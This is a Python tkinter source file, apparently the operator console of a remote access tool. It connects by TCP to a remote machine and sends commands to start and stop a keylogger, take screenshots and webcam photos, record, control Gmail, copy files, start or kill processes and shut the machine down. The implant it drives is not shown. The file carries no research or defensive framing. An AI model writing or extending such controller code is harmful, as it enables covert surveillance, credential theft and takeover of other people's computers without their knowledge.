import tkinter as tk
from tkinter import scrolledtext, filedialog, messagebox
import socket
import threading

DEFAULT_PORT = 12345

class NetworkClientGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Client Network Control")
        self.sock = None

        ip_frame = tk.Frame(root)
        ip_frame.pack(padx=10, pady=5)

        tk.Label(ip_frame, text="Server IP:").pack(side=tk.LEFT)
        self.ip_entry = tk.Entry(ip_frame, width=20)
        self.ip_entry.insert(0, "127.0.0.1")
        self.ip_entry.pack(side=tk.LEFT, padx=5)

        self.connect_button = tk.Button(ip_frame, text="Connect", command=self.connect_to_server)
        self.connect_button.pack(side=tk.LEFT)

        self.command_entry = tk.Entry(root, width=60)
        self.command_entry.pack(padx=10, pady=5)

        self.send_button = tk.Button(root, text="Send Command", command=self.send_command)
        self.send_button.pack(pady=5)

        self.create_buttons()

        self.output_box = scrolledtext.ScrolledText(root, width=80, height=20)
        self.output_box.pack(padx=10, pady=10)

        status_frame = tk.Frame(root)
        status_frame.pack(pady=5)

        self.keylogger_status = tk.StringVar(value="Keylogger: ❌ Off")
        self.recording_status = tk.StringVar(value="Recording: ❌ Off")

        tk.Label(status_frame, textvariable=self.keylogger_status, fg="blue", font=("Arial", 10, "bold")).pack(side=tk.LEFT, padx=20)
        tk.Label(status_frame, textvariable=self.recording_status, fg="green", font=("Arial", 10, "bold")).pack(side=tk.LEFT, padx=20)

    def create_buttons(self):
        button_groups = [
            [
                ("help", lambda: self.send_predefined("help")),
                ("list_services", lambda: self.send_predefined("list_services")),
                ("list_apps", lambda: self.send_predefined("list_apps")),
                ("screenshot", lambda: self.send_predefined("screenshot")),
                ("webcam_photo", lambda: self.send_predefined("webcam_photo")),
            ],
            [
                ("start_keylogger", self.send_start_keylogger),
                ("stop_keylogger", self.send_stop_keylogger),
                ("start_record", self.send_start_record),
                ("stop_record", self.send_stop_record),
                ("gmail_control", lambda: self.send_predefined("gmail_control")),
            ],
            [
                ("restart", lambda: self.send_predefined("restart")),
                ("shutdown", lambda: self.send_predefined("shutdown")),
                ("start <path>", self.send_start),
                ("stop <name>", self.send_stop),
                ("copyfile <path>", self.send_copyfile),
                ("exit", lambda: self.send_predefined("exit")),
            ],
        ]


        for group in button_groups:
            row = tk.Frame(self.root)
            row.pack(pady=2)
            for text, command in group:
                btn = tk.Button(row, text=text, width=18, command=command)
                btn.pack(side=tk.LEFT, padx=2)

    def connect_to_server(self):
        ip = self.ip_entry.get().strip()
        if not ip:
            messagebox.showwarning("Warning", "Please enter a server IP address.")
            return
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.connect((ip, DEFAULT_PORT))
            self.output_box.insert(tk.END, f"Connected to server at {ip}:{DEFAULT_PORT}\n")
        except Exception as e:
            self.output_box.insert(tk.END, f"Connection failed: {e}\n")
            self.sock = None

    def send_command(self):
        if not self.sock:
            self.output_box.insert(tk.END, "Not connected to server.\n")
            return
        cmd = self.command_entry.get()
        if not cmd:
            return
        try:
            self.sock.sendall(cmd.encode())
            self.output_box.insert(tk.END, f">> {cmd}\n")
            threading.Thread(target=self.receive_response, daemon=True).start()
        except Exception as e:
            self.output_box.insert(tk.END, f"Failed to send: {e}\n")

    def send_predefined(self, command):
        self.command_entry.delete(0, tk.END)
        self.command_entry.insert(0, command)
        self.send_command()

    def send_start(self):
        path = filedialog.askopenfilename(title="Select executable to start")
        if path:
            self.send_predefined(f"start {path}")

    def send_stop(self):
        name = simple_input("Enter process name to stop (e.g. notepad.exe)")
        if name:
            self.send_predefined(f"stop {name}")

    def send_copyfile(self):
        path = filedialog.askopenfilename(title="Select file to copy")
        if path:
            self.send_predefined(f"copyfile {path}")

    def receive_response(self):
        try:
            data = self.sock.recv(4096)
            if data:
                response = data.decode()
                self.output_box.insert(tk.END, f"{response}\n")
                self.output_box.see(tk.END)
            else:
                self.output_box.insert(tk.END, "Server closed the connection.\n")
        except Exception as e:
            self.output_box.insert(tk.END, f"Error receiving: {e}\n")

    def send_start_keylogger(self):
        self.send_predefined("start_keylogger")
        self.keylogger_status.set("Keylogger: ✅ On")

    def send_stop_keylogger(self):
        self.send_predefined("stop_keylogger")
        self.keylogger_status.set("Keylogger: ❌ Off")

    def send_start_record(self):
        self.send_predefined("start_record")
        self.recording_status.set("Recording: 🔴 Recording")

    def send_stop_record(self):
        self.send_predefined("stop_record")
        self.recording_status.set("Recording: ❌ Stopped")


def simple_input(prompt):
    input_win = tk.Toplevel()
    input_win.title("Input")
    tk.Label(input_win, text=prompt).pack(padx=10, pady=5)
    entry = tk.Entry(input_win, width=40)
    entry.pack(padx=10, pady=5)
    result = {"value": None}

    def confirm():
        result["value"] = entry.get()
        input_win.destroy()

    tk.Button(input_win, text="OK", command=confirm).pack(pady=5)
    input_win.grab_set()
    input_win.wait_window()
    return result["value"]

if __name__ == "__main__":
    root = tk.Tk()
    app = NetworkClientGUI(root)
    root.mainloop()
